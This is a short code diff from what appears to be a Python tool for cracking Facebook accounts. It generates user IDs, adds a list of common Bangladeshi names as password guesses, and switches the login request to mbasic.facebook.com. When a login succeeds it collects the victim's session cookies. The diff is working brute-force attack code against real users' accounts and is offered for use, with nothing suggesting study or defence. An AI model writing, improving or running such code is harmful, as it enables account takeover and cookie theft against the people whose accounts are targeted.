@@ -199,7 +199,7 @@ def v3():
         print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','sadiya','nusrat','fatema','mababa','hridoy','sahin','sabbir','sanjida']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
     print(' [♥] Crack process has been completed')
@@ -250,7 +250,7 @@ def rcrack1(uid,pwx,tl):
             'user-agent': pro,
             'viewport-width': '980',
 }
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
